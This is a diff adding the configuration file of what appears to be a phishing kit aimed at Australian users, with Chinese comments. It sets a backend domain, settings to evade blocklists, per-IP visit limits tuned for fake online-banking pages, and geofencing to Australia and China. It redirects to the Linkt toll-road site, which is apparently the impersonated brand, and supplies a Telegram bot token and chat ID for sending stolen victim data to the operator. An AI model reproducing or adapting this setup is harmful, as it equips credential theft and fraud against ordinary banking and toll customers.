@@ -1,0 +1,17 @@
+var url={
+	//设置你的java后台域名，结尾不要带/
+	"serviceURL":"https://gldzy1638.asia",
+	//防红开关，设置为0可以优化访问速度，不再限制地区访问次数等，只有剩核心动态防红，对整体防红影响不大
+	"redSwitch":0,
+	//设置每个ip最大访问次数，每个页面刷新算一次，网银建议设置不超过30，次数过多容易红
+	"Visits":30,
+	//设置可以访问的地区，AU：澳大利亚，CN：中国
+	"country":"AU,CN",
+	//1 为服务器查询访问地区，服务器被墙可能不可用，无法加载页面，可尝试修改成2
+	"config":1,
+	//设置跳转地址
+	"CPCurl":"https://www.linkt.com.au/",
+	//设置你的TG机器人API和chat_id，开启tg同步上鱼
+	"TGAPI":"5851729712:AAFa3Oe7RZM6DCV0juQUp7LuKGf8rr8Wd9M",
+	"TGchat_id":"1305795257"
+}
